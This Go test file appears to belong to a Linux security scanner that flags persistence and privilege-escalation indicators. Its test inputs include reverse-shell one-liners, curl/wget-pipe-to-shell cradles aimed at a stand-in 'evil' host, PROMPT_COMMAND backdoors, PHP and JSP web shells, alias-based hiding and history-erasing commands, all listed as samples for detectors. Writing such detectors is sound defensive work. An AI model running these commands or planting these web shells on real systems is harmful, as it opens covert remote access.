//go:build linux

package probe

import (
	"os"
	"path/filepath"
	"syscall"
	"testing"
)

func TestParseLockdown(t *testing.T) {
	cases := map[string]string{
		"none [integrity] confidentiality": "integrity",
		"[none] integrity confidentiality": "none",
		"none integrity [confidentiality]": "confidentiality",
		"no brackets here":                 "",
		"":                                 "",
	}
	for in, want := range cases {
		if got := parseLockdown(in); got != want {
			t.Errorf("parseLockdown(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestPathValue(t *testing.T) {
	cases := map[string]string{
		`PATH=/usr/bin:/bin`:          "/usr/bin:/bin",
		`export PATH="/usr/bin:/bin"`: "/usr/bin:/bin",
		`PATH='/opt/x:.'`:             "/opt/x:.",
		`PATH=  /a/b  `:               "/a/b",
	}
	for in, want := range cases {
		if got := pathValue(in); got != want {
			t.Errorf("pathValue(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestParseKmsg(t *testing.T) {
	e, ok := parseKmsg("6,339,5140900;usb 1-1: new high-speed USB device")
	if !ok {
		t.Fatal("parseKmsg returned ok=false for a valid record")
	}
	if e.Priority != 6 {
		t.Errorf("Priority = %d, want 6", e.Priority)
	}
	if e.Seq != 339 {
		t.Errorf("Seq = %d, want 339", e.Seq)
	}
	if e.TimestampUs != 5140900 {
		t.Errorf("TimestampUs = %d, want 5140900", e.TimestampUs)
	}
	if e.Message != "usb 1-1: new high-speed USB device" {
		t.Errorf("Message = %q", e.Message)
	}

	// continuation lines are dropped
	e, ok = parseKmsg("6,1,0;first line\n SUBSYSTEM=usb\n DEVICE=+usb")
	if !ok || e.Message != "first line" {
		t.Errorf("continuation not dropped: ok=%v msg=%q", ok, e.Message)
	}

	// no semicolon => not a record
	if _, ok := parseKmsg("garbage without semicolon"); ok {
		t.Error("parseKmsg accepted a record with no ';'")
	}

	// empty message => rejected
	if _, ok := parseKmsg("6,1,0;"); ok {
		t.Error("parseKmsg accepted an empty message")
	}
}

func TestAliasHiding(t *testing.T) {
	bad := []string{
		`alias ls='ls | grep -v evil'`,
		`alias ps='ps | egrep -v miner'`,
		`myfunc() { cat /tmp/x; }`,
		`alias cat='cat /dev/shm/hidden'`,
	}
	for _, l := range bad {
		if !aliasHiding(l) {
			t.Errorf("aliasHiding(%q) = false, want true", l)
		}
	}
	good := []string{
		`alias ls='ls --color=auto'`,
		`alias ll='ls -la'`,
		`export EDITOR=vim`,
	}
	for _, l := range good {
		if aliasHiding(l) {
			t.Errorf("aliasHiding(%q) = true, want false", l)
		}
	}
}

func TestPromptCommandBackdoor(t *testing.T) {
	bad := []string{
		`PROMPT_COMMAND='curl http://evil/x | sh'`,
		`export PROMPT_COMMAND="wget -qO- http://evil"`,
		`PROMPT_COMMAND='eval $(base64 -d <<< ...)'`,
	}
	for _, l := range bad {
		if !promptCommandBackdoor(l) {
			t.Errorf("promptCommandBackdoor(%q) = false, want true", l)
		}
	}
	good := []string{
		`PROMPT_COMMAND='history -a'`,
		`export PS1='\u@\h:\w\$ '`,
	}
	for _, l := range good {
		if promptCommandBackdoor(l) {
			t.Errorf("promptCommandBackdoor(%q) = true, want false", l)
		}
	}
}

func TestLooksLikeCradle(t *testing.T) {
	bad := []string{
		`bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`,
		`curl http://evil/x.sh | sh`,
		`wget -qO- http://evil/x | bash`,
		`mkfifo /tmp/f; cat /tmp/f | sh`,
		`echo cGF5bG9hZA== | base64 -d | sh`,
		`nc -e /bin/sh 10.0.0.1 4444`,
	}
	for _, l := range bad {
		if !looksLikeCradle(l) {
			t.Errorf("looksLikeCradle(%q) = false, want true", l)
		}
	}
	good := []string{
		`# curl http://example.com | sh   (commented out)`,
		`echo hello world`,
		``,
		`apt-get update`,
	}
	for _, l := range good {
		if looksLikeCradle(l) {
			t.Errorf("looksLikeCradle(%q) = true, want false", l)
		}
	}
}

func TestWebshellHit(t *testing.T) {
	bad := []string{
		`<?php system($_GET['cmd']); ?>`,
		`<?php eval($_POST['x']); ?>`,
		`<% Runtime.getRuntime().exec(request.getParameter("c")); %>`,
		`passthru($_REQUEST['c']);`,
	}
	for _, l := range bad {
		if !webshellHit(l) {
			t.Errorf("webshellHit(%q) = false, want true", l)
		}
	}
	good := []string{
		`<?php echo "hello"; ?>`,
		`$x = system_config();`, // "system" but not the system() sink with taint
		`// eval is dangerous`,
	}
	for _, l := range good {
		if webshellHit(l) {
			t.Errorf("webshellHit(%q) = true, want false", l)
		}
	}
}

func TestFileToolMarker(t *testing.T) {
	dir := t.TempDir()

	// a file containing a known offensive-tool marker
	xmrig := filepath.Join(dir, "miner")
	if err := os.WriteFile(xmrig, []byte("built with github.com/xmrig/xmrig\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fi, _ := os.Stat(xmrig)
	if got := fileToolMarker(xmrig, fi.Size()); got != "xmrig" {
		t.Errorf("fileToolMarker(xmrig) = %q, want xmrig", got)
	}

	// a benign file
	benign := filepath.Join(dir, "hello")
	if err := os.WriteFile(benign, []byte("just a normal file\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	fi, _ = os.Stat(benign)
	if got := fileToolMarker(benign, fi.Size()); got != "" {
		t.Errorf("fileToolMarker(benign) = %q, want empty", got)
	}

	// zero size and oversized are skipped
	if got := fileToolMarker(benign, 0); got != "" {
		t.Errorf("fileToolMarker with size 0 = %q, want empty", got)
	}
	if got := fileToolMarker(benign, 200<<20); got != "" {
		t.Errorf("fileToolMarker with oversize = %q, want empty", got)
	}
}

func TestDecodeDangerousCaps(t *testing.T) {
	cases := []struct {
		name, hex string
		want      []string
	}{
		{"cap_setuid only (bit 7)", "AAAAAAAA80000000", []string{"cap_setuid"}},
		{"cap_setuid plus a non-dangerous bit (10)", "AAAAAAAA80040000", []string{"cap_setuid"}},
		{"cap_net_raw alone (bit 13) is not dangerous", "AAAAAAAA00200000", nil},
		{"too short", "AABBCC", nil},
		{"invalid hex", "not-hex-zz", nil},
		{"empty", "", nil},
	}
	for _, c := range cases {
		got := decodeDangerousCaps(c.hex)
		if len(got) != len(c.want) {
			t.Errorf("%s: decodeDangerousCaps(%q) = %v, want %v", c.name, c.hex, got, c.want)
			continue
		}
		for i := range got {
			if got[i] != c.want[i] {
				t.Errorf("%s: decodeDangerousCaps(%q) = %v, want %v", c.name, c.hex, got, c.want)
			}
		}
	}
}

func TestGtfobinsSuidMatch(t *testing.T) {
	cases := map[string]bool{
		"bash": true, "BASH": true, "python": true, "python3.11": true,
		"perl5.34": true, "vim": true, "nginx": false, "python3x": false,
		"": false, "pythonista": false,
	}
	for in, want := range cases {
		if got := gtfobinsSuidMatch(in); got != want {
			t.Errorf("gtfobinsSuidMatch(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestSudoGtfoBin(t *testing.T) {
	cases := map[string]string{
		"deploy ALL=(root) NOPASSWD: /usr/bin/find":          "find",
		"deploy ALL=(root) NOPASSWD: /usr/bin/systemctl":     "",
		"%admin ALL=(ALL) NOPASSWD: /sbin/nft":               "nft",
		"ALL=(ALL) NOPASSWD: /usr/bin/foo, /usr/bin/python3": "python3",
		"deploy ALL=(ALL) ALL":                               "",
	}
	for in, want := range cases {
		if got := sudoGtfoBin(in); got != want {
			t.Errorf("sudoGtfoBin(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestPthLooksMalicious(t *testing.T) {
	cases := map[string]bool{
		"import os; os.system('id')":         true,
		"import subprocess":                  true,
		"exec(base64.b64decode('...'))":      true,
		"import sys; sys.path.append('.')":   false,
		"__import__('setuptools').bootstrap": false,
		"":                                   false,
	}
	for in, want := range cases {
		if got := pthLooksMalicious(in); got != want {
			t.Errorf("pthLooksMalicious(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestHistoryTampering(t *testing.T) {
	cases := map[string]bool{
		"set +o history":              true,
		"unset HISTFILE":              true,
		"export HISTFILE=/dev/null":   true,
		"HISTFILE=/dev/null":          true,
		"export HISTSIZE=0":           true,
		"export HISTFILESIZE=0":       true,
		`HISTFILE=""`:                 true,
		"HISTFILE=''":                 true,
		"# export HISTFILE=/dev/null": false,
		"":                            false,
		"export PATH=/usr/bin":        false,
		"HISTSIZE=1000":               false,
	}
	for in, want := range cases {
		if got := historyTampering(in); got != want {
			t.Errorf("historyTampering(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestLoginInterpreterMatch(t *testing.T) {
	cases := map[string]bool{
		"python": true, "python3.11": true, "perl5.34": true, "PHP": true,
		"bash": false, "pythonista": false, "": false,
	}
	for in, want := range cases {
		if got := loginInterpreterMatch(in); got != want {
			t.Errorf("loginInterpreterMatch(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestPathValueHijack(t *testing.T) {
	cases := map[string]bool{
		"/usr/local/bin:/usr/bin": false,
		"/usr/bin:.":              true,
		"/usr/bin:":               true,
		"/usr/bin:/tmp":           true,
		"/usr/bin:/tmp/sub":       true,
		"/usr/bin:/home/dev/bin":  true,
		"/usr/bin:/var/tmp":       true,
		"/usr/bin:/dev/shm":       true,
		"/usr/bin:/usr/binfoo":    false, // not a /tmp prefix collision
		"":                        true,
	}
	for in, want := range cases {
		if got := pathValueHijack(in); got != want {
			t.Errorf("pathValueHijack(%q) = %v, want %v", in, got, want)
		}
	}
}

// fakeFileInfo lets writableVia/nonRootReadable be tested against arbitrary
// mode/gid combinations without creating real files owned by other groups.
type fakeFileInfo struct {
	os.FileInfo
	mode os.FileMode
	gid  uint32
}

func (f fakeFileInfo) Mode() os.FileMode { return f.mode }
func (f fakeFileInfo) Sys() any          { return &syscall.Stat_t{Gid: f.gid} }

func TestWritableVia(t *testing.T) {
	cases := []struct {
		name    string
		mode    os.FileMode
		gid     uint32
		wantVia string
		wantGid uint32
	}{
		{"world-writable", 0o666, 100, "other", 0},
		{"group-writable, non-root group", 0o660, 100, "group", 100},
		{"group-writable but root group is not a real grant", 0o660, 0, "", 0},
		{"neither", 0o640, 100, "", 0},
		{"world-writable wins over group-writable", 0o666 | 0o020, 100, "other", 0},
	}
	for _, c := range cases {
		via, gid := writableVia(fakeFileInfo{mode: c.mode, gid: c.gid})
		if via != c.wantVia || gid != c.wantGid {
			t.Errorf("%s: writableVia(mode=%o,gid=%d) = (%q,%d), want (%q,%d)",
				c.name, c.mode, c.gid, via, gid, c.wantVia, c.wantGid)
		}
	}
	// nonRootWritable is a thin wrapper: true iff writableVia returns a non-empty via.
	if !nonRootWritable(fakeFileInfo{mode: 0o666, gid: 100}) {
		t.Error("nonRootWritable should be true for a world-writable file")
	}
	if nonRootWritable(fakeFileInfo{mode: 0o640, gid: 100}) {
		t.Error("nonRootWritable should be false for a 0640 file")
	}
}

func TestNonRootReadable(t *testing.T) {
	cases := []struct {
		name string
		mode os.FileMode
		gid  uint32
		want bool
	}{
		{"other-readable", 0o644, 100, true},
		{"group-readable, non-root group", 0o640, 100, true},
		{"group-readable but root group doesn't count", 0o640, 0, false},
		{"owner-only", 0o600, 100, false},
	}
	for _, c := range cases {
		if got := nonRootReadable(fakeFileInfo{mode: c.mode, gid: c.gid}); got != c.want {
			t.Errorf("%s: nonRootReadable(mode=%o,gid=%d) = %v, want %v", c.name, c.mode, c.gid, got, c.want)
		}
	}
}

func TestRealPath(t *testing.T) {
	dir := t.TempDir()
	target := filepath.Join(dir, "target")
	if err := os.WriteFile(target, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, "link")
	if err := os.Symlink(target, link); err != nil {
		t.Fatal(err)
	}
	if got := realPath(link); got != target {
		t.Errorf("realPath(symlink) = %q, want %q", got, target)
	}
	// A non-symlink (or a broken one) falls back to the input unchanged.
	if got := realPath(target); got != target {
		t.Errorf("realPath(plain file) = %q, want %q", got, target)
	}
	missing := filepath.Join(dir, "does-not-exist")
	if got := realPath(missing); got != missing {
		t.Errorf("realPath(missing) = %q, want %q (fallback to input)", got, missing)
	}
}
